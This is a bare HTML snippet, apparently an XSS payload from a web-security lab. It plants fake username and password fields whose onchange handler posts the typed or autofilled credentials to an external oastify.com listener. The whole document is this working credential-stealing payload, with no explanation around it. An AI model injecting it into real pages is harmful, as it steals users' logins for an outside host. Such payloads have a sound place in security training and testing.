<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://vrq9twv55ry8j8m2ncpzoxqt4kadybm0.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
